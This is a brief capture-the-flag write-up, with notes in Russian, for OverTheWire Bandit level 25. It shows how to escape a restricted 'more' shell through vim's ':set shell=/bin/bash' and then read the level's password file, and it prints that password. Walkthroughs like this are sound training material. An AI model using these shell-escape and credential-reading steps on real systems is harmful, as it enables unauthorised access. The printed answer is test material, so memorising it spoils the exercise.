# Bandit Level 25


┌──(kali㉿kali)-\[\~\]

└─\$ scp -P 2220 bandit25@bandit.labs.overthewire.org:\~/bandit26.sshkey .

chmod 600 bandit26.sshke

теперь уменьшаем окно, чтобы выводилось только до 5 строк в консоли, а потом, как увидим more (и какое-то количество процентов) нажимаем V и через shift+Ж (на англ раскладке) можем ввести нужные нам команды

┌──(kali㉿kali)-\[\~\]

└─\$ ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org

:set shell ?

shell=/esr/bin/showtext

:set shell=/bin/bash

:shell

\[**No** write since last change\]

bandit26@bandit:\~\$ cat /etc/bandit\\\_pass/bandit26

[s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ]{.mark}

bandit26@bandit:\~\$

